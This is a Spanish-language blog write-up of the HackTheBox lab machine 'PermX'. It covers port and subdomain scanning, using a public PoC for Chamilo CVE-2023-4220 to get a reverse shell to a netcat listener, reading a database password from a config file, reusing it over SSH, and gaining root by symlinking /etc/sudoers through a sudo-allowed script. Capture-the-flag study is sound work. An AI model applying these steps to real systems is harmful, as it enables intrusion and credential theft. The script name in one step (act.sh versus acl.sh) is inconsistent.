<!doctype html>
<!--
  Minimal Mistakes Jekyll Theme 4.26.2 by Michael Rose
  Copyright 2013-2024 Michael Rose - mademistakes.com | @mmistakes
  Free for personal and commercial use under the MIT license
  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
-->

<html lang="es-ES" class="no-js">
  <head>
    <meta charset="utf-8">

<!-- begin _includes/seo.html --><title>M√°quina PermX de HackTheBox con dificultad f√°cil - BlogPersonal</title>
<meta name="description" content="En esta m√°quina se abordaron conceptos sencillos pero interesantes. Nos muestra los riesgos asociados al uso de la misma contrase√±a en m√∫ltiples servicios, y nos hace tomar conciencia de lo vulnerables que podemos estar.">


  <meta name="author" content="Eduardo Rivera">
  
  <meta property="article:author" content="Eduardo Rivera">
  


<meta property="og:type" content="article">
<meta property="og:locale" content="es_ES">
<meta property="og:site_name" content="BlogPersonal">
<meta property="og:title" content="M√°quina PermX de HackTheBox con dificultad f√°cil">
<meta property="og:url" content="http://localhost:4000/hackthebox/permx/">


  <meta property="og:description" content="En esta m√°quina se abordaron conceptos sencillos pero interesantes. Nos muestra los riesgos asociados al uso de la misma contrase√±a en m√∫ltiples servicios, y nos hace tomar conciencia de lo vulnerables que podemos estar.">



  <meta property="og:image" content="http://localhost:4000/assets/images/MaquinaPermx/permx.webp">





  <meta property="article:published_time" content="2024-07-12T00:00:00-06:00">





  

  


<link rel="canonical" href="http://localhost:4000/hackthebox/permx/">












<!-- end _includes/seo.html -->



  <link href="/feed.xml" type="application/atom+xml" rel="alternate" title="BlogPersonal Feed">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<script type="text/javascript">
  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
  
</script>

<!-- For all browsers -->
<link rel="stylesheet" href="/assets/css/main.css">
<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@latest/css/all.min.css"></noscript>



    <!-- start custom head snippets -->

<!-- insert favicons. use https://realfavicongenerator.net/ -->

<!-- end custom head snippets -->

  </head>

  <body class="layout--single wide" dir="ltr">
    <nav class="skip-links">
  <ul>
    <li><a href="#site-nav" class="screen-reader-shortcut">Saltar a navegaci√≥n principal</a></li>
    <li><a href="#main" class="screen-reader-shortcut">Saltar a contenido</a></li>
    <li><a href="#footer" class="screen-reader-shortcut">Saltar a pie</a></li>
  </ul>
</nav>

    

<div class="masthead">
  <div class="masthead__inner-wrap">
    <div class="masthead__menu">
      <nav id="site-nav" class="greedy-nav">
        
        <a class="site-title" href="/">
          BlogPersonal
          
        </a>
        <ul class="visible-links"><li class="masthead__menu-item">
              <a
                href="https://eduardo99rp.github.io/"
                
                
              >Home</a>
            </li></ul>
        
        <button class="search__toggle" type="button">
          <span class="visually-hidden">Alternar b√∫squeda</span>
          <i class="fas fa-search"></i>
        </button>
        
        <button class="greedy-nav__toggle hidden" type="button">
          <span class="visually-hidden">Alternar men√∫</span>
          <div class="navicon"></div>
        </button>
        <ul class="hidden-links hidden"></ul>
      </nav>
    </div>
  </div>
</div>


    <div class="initial-content">
      





<div id="main" role="main">
  
  <div class="sidebar sticky">
  


<div itemscope itemtype="https://schema.org/Person" class="h-card">

  
    <div class="author__avatar">
      <a href="http://localhost:4000/">
        <img src="/assets/images/bio-photo.jpg" alt="Eduardo Rivera" itemprop="image" class="u-photo">
      </a>
    </div>
  

  <div class="author__content">
    <h3 class="author__name p-name" itemprop="name">
      <a class="u-url" rel="me" href="http://localhost:4000/" itemprop="url">Eduardo Rivera</a>
    </h3>
    
      <div class="author__bio p-note" itemprop="description">
        <p>Ingeniero en computacion</p>

      </div>
    
  </div>

  <div class="author__urls-wrapper">
    <button class="btn btn--inverse">Seguir</button>
    <ul class="author__urls social-icons">
      

      
        
          
            <li><a href="https://eduardo99rp.github.io/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">Mi blog</span></a></li>
          
        
          
            <li><a href="https://github.com/Eduardo99RP" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
          
        
          
            <li><a href="https://www.linkedin.com/in/juan-eduardo-rivera-p%C3%A9rez-a76909226/" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-linkedin" aria-hidden="true"></i><span class="label">Linkedin</span></a></li>
          
        
      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      

      <!--
  <li>
    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer me">
      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
    </a>
  </li>
-->
    </ul>
  </div>
</div>

  
  </div>



  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
    <meta itemprop="headline" content="M√°quina PermX de HackTheBox con dificultad f√°cil">
    <meta itemprop="description" content="En esta m√°quina se abordaron conceptos sencillos pero interesantes. Nos muestra los riesgos asociados al uso de la misma contrase√±a en m√∫ltiples servicios, y nos hace tomar conciencia de lo vulnerables que podemos estar.">
    <meta itemprop="datePublished" content="2024-07-12T00:00:00-06:00">
    

    <div class="page__inner-wrap">
      
        <header>
          <h1 id="page-title" class="page__title" itemprop="headline">
            <a href="http://localhost:4000/hackthebox/permx/" itemprop="url">M√°quina PermX de HackTheBox con dificultad f√°cil
</a>
          </h1>
          

  <p class="page__meta">
    

    

    
      
      

      <span class="page__meta-readtime">
        <i class="far fa-clock" aria-hidden="true"></i>
        
          10 minuto(s) de lectura
        
      </span>
    
  </p>


        </header>
      

      <section class="page__content" itemprop="text">
        
        <h3 id="recocimiento">Recocimiento</h3>
<p style="text-align: justify;">
Esta m√°quina est√° clasificada como f√°cil y no puedo decir lo contrario. Lo primero que se hace es un escaneo usando nmap con la siguiente l√≠nea de c√≥digo:
</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-p-</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-n</span> <span class="nt">--open</span> <span class="nt">-vvv</span> <span class="nt">-sS</span> <span class="nt">-oG</span> allPorts 10.10.11.23
</code></pre></div></div>
<p style="text-align: justify;">
EEl escaneo nos arroj√≥ que est√°n abiertos dos puertos, el 22 y el 80, algo muy com√∫n para un servidor que aloja un servicio web. Para ello, vamos a escanear de manera exhaustiva los puertos con el siguiente comando: 
</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nmap <span class="nt">-sCV</span> <span class="nt">-p22</span>,80 <span class="nt">-oN</span> Ports 10.10.11.23
</code></pre></div></div>

<p>Nos arroja la siguiente informaci√≥n:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Nmap 7.94SVN scan initiated Thu Jul 11 16:02:33 2024 as: nmap -sCV -p22,80 -oN Ports 10.10.11.23</span>
Nmap scan report <span class="k">for </span>10.10.11.23
Host is up <span class="o">(</span>0.34s latency<span class="o">)</span><span class="nb">.</span>

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://permx.htb
|_http-server-header: Apache/2.4.52 <span class="o">(</span>Ubuntu<span class="o">)</span>
Service Info: Host: 127.0.0.1<span class="p">;</span> OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ 
</code></pre></div></div>
<p>Debemos agregar al archivo hosts la direcci√≥n y su enlace:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo </span>nano /etc/hosts
</code></pre></div></div>
<p>En el archivo se agrega lo siguiente:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>10.10.11.23     permx.htb
</code></pre></div></div>
<p>Una vez guardados los cambios, vamos a nuestro navegador y analizamos la p√°gina:</p>

<p align="center">
<img src="/assets/images/MaquinaPermx/pagina1.png" />
</p>

<p style="text-align: justify;">
Navegando en la p√°gina, no encontramos nada en lo cual se pueda comenzar un ataque, as√≠ que ahora procedemos a usar la herramienta `ffuf` para encontrar posibles p√°ginas ocultas.
</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ ffuf <span class="nt">-u</span> http://permx.htb/FUZZ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/big.txt

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htpasswd               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 138ms]
.htaccess               [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 140ms]
css                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 226ms]
img                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 205ms]
js                      [Status: 301, Size: 303, Words: 20, Lines: 10, Duration: 160ms]
lib                     [Status: 301, Size: 304, Words: 20, Lines: 10, Duration: 125ms]
server-status           [Status: 403, Size: 274, Words: 20, Lines: 10, Duration: 129ms]
:: Progress: [20476/20476] :: Job [1/1] :: 162 req/sec :: Duration: [0:01:29] :: Errors: 0 ::

</span></code></pre></div></div>
<p style="text-align: justify;">

Con el escaneo encontramos diversas p√°ginas:

<ul>
  <li><a href="http://permx.htb/css/" target="_blank">http://permx.htb/css/</a></li>
  <li><a href="http://permx.htb/img/" target="_blank">http://permx.htb/img/</a></li>
  <li><a href="http://permx.htb/js/" target="_blank">http://permx.htb/js/</a></li>
  <li><a href="http://permx.htb/lib/" target="_blank">http://permx.htb/lib/</a></li>
</ul>


Pero hay un problema, en ninguna de estas se encontr√≥ nada interesante, as√≠ que procedemos a buscar alguna p√°gina asociada o subdominio, es decir, host distinto que un usuario tenga que iniciar sesi√≥n. Para ello, vamos a usar fuzz de otra manera.

</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ ffuf <span class="nt">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt <span class="nt">-u</span> http://permx.htb <span class="nt">-H</span> <span class="s2">"Host: FUZZ.permx.htb"</span> <span class="nt">-fc</span> 302

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://permx.htb
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.permx.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 302
________________________________________________

www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 510ms]
lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 270ms]
[WARN] Caught keyboard interrupt (Ctrl-C)
</span></code></pre></div></div>
<p style="text-align: justify;">

Como podemos ver, encontramos dos subdominios, los cuales son:

<ul>
  <li><a href="http://www.permx.htb/" target="_blank">http://www.permx.htb/</a></li>
  <li><a href="http://lms.permx.htb/" target="_blank">http://lms.permx.htb/</a></li>
</ul>

De estos subdominios, el que realmente es interesante es el segundo (lms.permx.htb), en este podemos encontrar el panel de inicio de sesi√≥n el cual usa Chamilo:
</p>

<p align="center">
<img src="/assets/images/MaquinaPermx/pagina2.png" />
</p>

<p style="text-align: justify;">
En esta p√°gina podemos encontrar un inicio de sesi√≥n. Probamos con credenciales t√≠picas como admin - admin, pero no tiene fallas de ese estilo. As√≠ como en la p√°gina anterior vimos que ten√≠a p√°ginas ocultas, procedemos a buscar si esta cuenta con p√°ginas ocultas:
</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ ffuf <span class="nt">-u</span> http://lms.permx.htb/FUZZ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/big.txt


        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://lms.permx.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

.htaccess               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 220ms]
.htpasswd               [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 225ms]
LICENSE                 [Status: 200, Size: 35147, Words: 5836, Lines: 675, Duration: 164ms]
app                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 176ms]
bin                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 290ms]
certificates            [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 326ms]
documentation           [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 137ms]
favicon.ico             [Status: 200, Size: 2462, Words: 3, Lines: 2, Duration: 338ms]
main                    [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 135ms]
plugin                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 153ms]
robots.txt              [Status: 200, Size: 748, Words: 75, Lines: 34, Duration: 156ms]
server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 137ms]
src                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 156ms]
vendor                  [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 127ms]
web                     [Status: 301, Size: 312, Words: 20, Lines: 10, Duration: 161ms]
:: Progress: [20476/20476] :: Job [1/1] :: 47 req/sec :: Duration: [0:01:38] :: Errors: 0 ::
</span></code></pre></div></div>
<p style="text-align: justify;">

De la misma manera que en la p√°gina anterior, encontramos las siguientes p√°ginas:

<ul>
    <li><a href="http://lms.permx.htb/LICENSE/" target="_blank">http://lms.permx.htb/LICENSE/</a></li>
    <li><a href="http://lms.permx.htb/app/" target="_blank">http://lms.permx.htb/app/</a></li>
    <li><a href="http://lms.permx.htb/bin/" target="_blank">http://lms.permx.htb/bin/</a></li>
    <li><a href="http://lms.permx.htb/certificates/" target="_blank">http://lms.permx.htb/certificates/</a></li>
    <li><a href="http://lms.permx.htb/documentation/" target="_blank">http://lms.permx.htb/documentation/</a></li>
    <li><a href="http://lms.permx.htb/favicon.ico/" target="_blank">http://lms.permx.htb/favicon.ico/</a></li>
    <li><a href="http://lms.permx.htb/main/" target="_blank">http://lms.permx.htb/main/</a></li>
    <li><a href="http://lms.permx.htb/plugin/" target="_blank">http://lms.permx.htb/plugin/</a></li>
    <li><a href="http://lms.permx.htb/robots.txt/" target="_blank">http://lms.permx.htb/robots.txt/</a></li>
    <li><a href="http://lms.permx.htb/src/" target="_blank">http://lms.permx.htb/src/</a></li>
    <li><a href="http://lms.permx.htb/vendor/" target="_blank">http://lms.permx.htb/vendor/</a></li>
    <li><a href="http://lms.permx.htb/web/" target="_blank">http://lms.permx.htb/web/</a></li>
</ul>

Si bien encontramos una variedad de enlaces, ninguno de estos es realmente relevante, ya que, a pesar de encontrar informaci√≥n, esta no es de utilidad ni muestra alguna brecha de seguridad aparente. As√≠ que nos queda investigar si la versi√≥n de Chamilo que se utiliz√≥ en la p√°gina web tiene alguna vulnerabilidad. Para ello, podemos verla en el enlace 
        <a href="http://lms.permx.htb/documentation/" target="_blank">http://lms.permx.htb/documentation/</a>, el cual nos muestra la siguiente informaci√≥n:
    </p>

<p align="center">
<img src="/assets/images/MaquinaPermx/pagina3.png" />
</p>

<p style="text-align: justify;">
    Podemos observar que la versi√≥n utilizada es Chamilo 1.11. Despu√©s de una investigaci√≥n, hallamos que s√≠ tiene una vulnerabilidad, la cual se puede encontrar como:
</p>
<ul>
        <li><a href="https://pentest-tools.com/vulnerabilities-exploits/chamilo-lms-11124-remote-code-execution_22949" target="_blank">CVE-2023-4220</a></li>
</ul>
<p style="text-align: justify;">
        Esta vulnerabilidad nos dice que:
</p>
<ul style="text-align: justify;">
    <li><strong>Descripci√≥n de la vulnerabilidad</strong>
        <p>La carga no restringida de archivos en la funcionalidad de carga de archivos grandes en <code>/main/inc/lib/javascript/bigupload/inc/bigUpload.php</code> en Chamilo LMS &lt;= v1.11.24 permite a atacantes no autenticados realizar ataques de cross-site scripting almacenados y obtener la ejecuci√≥n remota de c√≥digo a trav√©s de la carga de web shell.</p>
        </li>
    <li><strong>Descripci√≥n del riesgo</strong>
        <p>Existe el riesgo de que un atacante remoto no autenticado pueda comprometer completamente el servidor para robar informaci√≥n confidencial, instalar ransomware o pivotar a la red interna.
    </p>
    </li>
        <li><strong>Recomendaci√≥n</strong>
            <p>Se recomienda actualizar el software afectado a la √∫ltima versi√≥n, que mitiga esta vulnerabilidad.</p>
        </li>
    </ul>
<p style="text-align: justify;">
        Referencia: <a href="https://pentest-tools.com/vulnerabilities-exploits/chamilo-lms-11124-remote-code-execution_22949" target="_blank">Chamilo LMS &lt;= 1.11.24 - Remote Code Execution</a>
    </p>

<h3 id="explotacion">Explotacion</h3>
<p style="text-align: justify;">
Una vez entendida la vulnerabilidad, procedemos a buscar un exploit o, en su caso, programarlo. Para fines pr√°cticos, se utiliza el siguiente exploit:
    </p>

<ul>
  <li><a href="https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc">Chamilo LMS Unauthenticated Big Upload File RCE PoC</a></li>
</ul>

<p>Clonamos el exploit y accedemos a la carpeta, luego procedemos a ejecutar el siguiente comando:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 main.py <span class="nt">-u</span> http://lms.permx.htb/ <span class="nt">-a</span> revshell
</code></pre></div></div>
<p>Antes de ejecutar el comando, debemos estar en otra terminal y asegurarnos de haber ejecutado el siguiente comando para escuchar en el puerto:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lnvp</span> <span class="o">[</span>PORT

<span class="c">#Ejemplo</span>
nc <span class="nt">-nlvp</span> 4444 
</code></pre></div></div>
<p>Si todo fue exitoso, la terminal donde ejecutamos el exploit deber√≠a finalizar de la siguiente manera:</p>

<p align="center">
<img src="/assets/images/MaquinaPermx/pagina4.png" />
</p>

<p>Y la terminal que estamos escuchando estaria asi:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ùØ nc <span class="nt">-nlvp</span> 4444
listening on <span class="o">[</span>any] 4444 ...
connect to <span class="o">[</span>10.10.14.59] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.23] 39654
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1186<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files<span class="nv">$ </span>
</code></pre></div></div>

<p>Despu√©s de investigar en la m√°quina, encontramos la siguiente informaci√≥n:</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@permx:/var/www/chamilo/app/config<span class="nv">$ </span><span class="nb">ls
</span>add_course.conf.dist.php   course_info.conf.php  profile.conf.dist.php
add_course.conf.php        events.conf.dist.php  profile.conf.php
assetic.yml                events.conf.php       routing.yml
auth.conf.dist.php         fos                   routing_admin.yml
auth.conf.php              ivory_ckeditor.yml   routing_dev.yml
config.yml                 mail.conf.dist.php    routing_front.yml
config_dev.yml             mail.conf.php         security.yml
config_prod.yml            migrations.yml        services.yml
configuration.php          mopa                  sonata
course_info.conf.dist.php  parameters.yml.dist

www-data@permx:/var/www/chamilo/app/config<span class="nv">$ </span><span class="nb">cat </span>configuration.php
</code></pre></div></div>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
<span class="c1">// Chamilo version 1.11.24</span>
<span class="c1">// File generated by /install/index.php script - Sat, 20 Jan 2024 18:20:32 +0000</span>
<span class="cm">/* For licensing terms, see /license.txt */</span>
<span class="cd">/**
 * This file contains a list of variables that can be modified by the campus site's server administrator.
 * Pay attention when changing these variables, some changes may cause Chamilo to stop working.
 * If you changed some settings and want to restore them, please have a look at
 * configuration.dist.php. That file is an exact copy of the config file at install time.
 * Besides the $_configuration, a $_settings array also exists, that
 * contains variables that can be changed and will not break the platform.
 * These optional settings are defined in the database, now
 * (table settings_current).
 */</span>

<span class="c1">// Database connection settings.</span>
<span class="nv">$_configuration</span><span class="p">[</span><span class="s1">'db_host'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'localhost'</span><span class="p">;</span>
<span class="nv">$_configuration</span><span class="p">[</span><span class="s1">'db_port'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'3306'</span><span class="p">;</span>
<span class="nv">$_configuration</span><span class="p">[</span><span class="s1">'main_database'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'chamilo'</span><span class="p">;</span>
<span class="nv">$_configuration</span><span class="p">[</span><span class="s1">'db_user'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'chamilo'</span><span class="p">;</span>
<span class="nv">$_configuration</span><span class="p">[</span><span class="s1">'db_password'</span><span class="p">]</span> <span class="o">=</span> <span class="s1">'03F6lY3uXAP2bkW8'</span><span class="p">;</span>
<span class="c1">// Enable access to database management for platform admins.</span>
<span class="nv">$_configuration</span><span class="p">[</span><span class="s1">'db_manager_enabled'</span><span class="p">]</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
</code></pre></div></div>
<p style="text-align: justify;">

En este caso, podemos encontrar una contrase√±a. Esta contrase√±a, en primeras instancias, es para iniciar sesi√≥n en la base de datos, pero podemos probar si esta contrase√±a funciona para conectarnos al usuario encontrado. Este usuario lo encontramos al acceder a la carpeta /home/. Ah√≠ podemos ver ese usuario, as√≠ que procederemos a intentar iniciar sesi√≥n por SSH.
</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload<span class="nv">$ </span><span class="nb">cd</span> /home
<span class="nb">cd</span> /home
www-data@permx:/home<span class="nv">$ </span><span class="nb">ls
ls
</span>mtz
www-data@permx:/home<span class="nv">$ </span>
</code></pre></div></div>
<p>Para iniciar una conexion ssh procedemos ejecuatar el siguiente comando:</p>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh mtz@10.10.11.23
</code></pre></div></div>
<p>una vez iniciado nos pedira la contrasela la cual insertaremos la que encontramos y soprendentemente es la misma contrase√±a</p>

<p align="center">
<img src="/assets/images/MaquinaPermx/pagina5.png" />
</p>

<p>Como podemos ver solo tenemos acceso a un archivo el cual nos permitira elevar previlegios</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mtz@permx:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>mtz on permx:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty

User mtz may run the following commands on permx:
    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /opt/acl.sh
mtz@permx:~<span class="nv">$ </span><span class="nb">cat</span> /opt/acl.sh 
<span class="c">#!/bin/bash</span>

<span class="k">if</span> <span class="o">[</span> <span class="s2">"$#"</span> <span class="nt">-ne</span> 3 <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
    /usr/bin/echo <span class="s2">"Usage: </span><span class="nv">$0</span><span class="s2"> user perm file"</span>
    <span class="nb">exit </span>1
<span class="k">fi

</span><span class="nv">user</span><span class="o">=</span><span class="s2">"</span><span class="nv">$1</span><span class="s2">"</span>
<span class="nv">perm</span><span class="o">=</span><span class="s2">"</span><span class="nv">$2</span><span class="s2">"</span>
<span class="nv">target</span><span class="o">=</span><span class="s2">"</span><span class="nv">$3</span><span class="s2">"</span>

<span class="k">if</span> <span class="o">[[</span> <span class="s2">"</span><span class="nv">$target</span><span class="s2">"</span> <span class="o">!=</span> /home/mtz/<span class="k">*</span> <span class="o">||</span> <span class="s2">"</span><span class="nv">$target</span><span class="s2">"</span> <span class="o">==</span> <span class="k">*</span>..<span class="k">*</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then</span>
    /usr/bin/echo <span class="s2">"Access denied."</span>
    <span class="nb">exit </span>1
<span class="k">fi</span>

<span class="c"># Check if the path is a file</span>
<span class="k">if</span> <span class="o">[</span> <span class="o">!</span> <span class="nt">-f</span> <span class="s2">"</span><span class="nv">$target</span><span class="s2">"</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>
    /usr/bin/echo <span class="s2">"Target must be a file."</span>
    <span class="nb">exit </span>1
<span class="k">fi</span>
</code></pre></div></div>

<p>Procedimiento para elevar previlegios</p>
<p align="center">
<img src="/assets/images/MaquinaPermx/pagina7.png" />
</p>

<p><strong>Explicaci√≥n</strong></p>

<p>1- Crear un enlace simb√≥lico:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ln</span> <span class="nt">-s</span> /etc/sudoers symlink
</code></pre></div></div>
<ul style="text-align: justify;">
    <li><strong>ln</strong>: Comando para crear enlaces.</li>
    <li><strong>-s</strong>: Indica que se crear√° un enlace simb√≥lico (o "symlink").</li>
    <li><strong>/etc/sudoers</strong>: Archivo original al que se crear√° el enlace.</li>
    <li><strong>symlink</strong>: Nombre del nuevo enlace simb√≥lico.</li>
</ul>
<p style="text-align: justify;">
    Este comando crea un enlace simb√≥lico llamado symlink que apunta al archivo /etc/sudoers. Los enlaces simb√≥licos son como atajos que apuntan a otro archivo o directorio.
</p>

<p>2- Listar archivos con detalles:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">ls</span> <span class="nt">-l</span>
</code></pre></div></div>
<ul style="text-align: justify;">
    <li><strong>ls</strong>: Comando para listar archivos y directorios.<br />
        <p>Este comando mostrar√° una lista de archivos en el directorio actual, incluida informaci√≥n detallada sobre cada archivo. Entre ellos, se mostrar√° el enlace simb√≥lico symlink.</p>
    </li>
    <li><strong>-l</strong>: Muestra una lista detallada de archivos con permisos, n√∫mero de enlaces, propietario, grupo, tama√±o, fecha de modificaci√≥n y nombre del archivo.</li>
</ul>

<p>3- Ejecutar un script con privilegios:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /opt/act.sh mtz rwx /home/mtz/symlink
</code></pre></div></div>
<ul style="text-align: justify;">
    <li><strong>sudo</strong>: Ejecuta un comando con privilegios de superusuario (root).</li>
    <li><strong>/opt/act.sh</strong>: Ruta al script que se va a ejecutar.</li>
    <li><strong>mtz rwx /home/mtz/symlink</strong>: Argumentos pasados al script.</li>
</ul>
<p style="text-align: justify;">
    Este comando ejecuta el script /opt/act.sh con privilegios elevados, pasando los argumentos mtz, rwx y /home/mtz/symlink. La naturaleza de estos argumentos y el prop√≥sito del script depender√° de su contenido.
</p>

<p>4- Editar un archivo con nano:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nano /home/mtz/symlink
</code></pre></div></div>
<ul style="text-align: justify;">
    <li><strong>nano</strong>: Editor de texto en la l√≠nea de comandos.</li>
    <li><strong>/home/mtz/symlink</strong>: Archivo que se va a editar.</li>
</ul>
<p style="text-align: justify;">
    Este comando abre el archivo /home/mtz/symlink en el editor de texto nano. Como symlink es un enlace simb√≥lico que apunta a /etc/sudoers, estar√°s editando el archivo real /etc/sudoers.
</p>
<p align="center">
    <img src="/assets/images/MaquinaPermx/pagina6.png" alt="Ejemplo de imagen" />
</p>

